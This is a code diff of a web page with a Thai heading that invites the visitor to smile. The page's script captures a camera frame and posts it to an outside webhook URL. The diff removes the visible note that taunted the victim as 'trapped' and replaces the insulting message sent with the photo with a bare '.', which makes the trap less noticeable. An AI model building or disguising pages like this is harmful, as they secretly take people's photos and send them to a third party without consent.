@@ -65,7 +65,7 @@
 <body>
 <div class="container">
     <h1>ยิ้มหน่อยเบ้บ^^</h1>
-    <div class="note">หมายเหตุ: โดนดักละไอควาย</div>
+    <div class="note">หมายเหตุ: </div>
 
     <div class="camera-box">
         <video id="video" autoplay playsinline></video>
@@ -107,7 +107,7 @@ async function captureAndSend() {
     canvas.toBlob(async (blob) => {
         const formData = new FormData();
         formData.append("file", blob, "camera.png");
-        formData.append("content", "โง่");
+        formData.append("content", ".");
 
         try {
             await fetch(webhookURL, {
